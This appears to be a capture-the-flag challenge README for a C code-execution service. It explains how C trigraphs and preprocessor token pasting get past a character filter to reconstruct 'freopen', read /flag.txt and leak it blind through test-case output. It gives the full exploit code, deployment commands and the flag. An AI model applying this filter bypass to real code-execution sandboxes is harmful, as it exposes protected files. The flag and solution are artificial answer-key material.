# SW Expert Academy

## Vulnerability
Insufficient string filtering executing untrusted C source code.

## Intended Solution
Bypass filtering with C pre-processor macro(String concatenation)
Filtered `#` characater can be bypassed with C trigraph notation.
Both exploit strategies are available, sending flag to hacker's server and blind exfiltration with correct test case feedback.
```
#include <stdio.h>
int main() {
    //Your code will be place here!
    ??=define cc(a,b) a??=??=b
    char flag[1024];
    cc(freo,pen)("/flag.txt", "r", stdin);
    scanf("%s", flag);

    int len = 0;
    while (flag[len++]);
    if (flag[0] == 'S') {
        puts("2/3");
    }
    //Please enjoy problem solving!
}
```

## Deployment
Run server with 3000 port
```
$ cd ./prob
$ SOFTECH_PORT=3000 docker-compose up -d
```

## Flag
```
SCTF{take-care-when-execute-unknown-code}
```
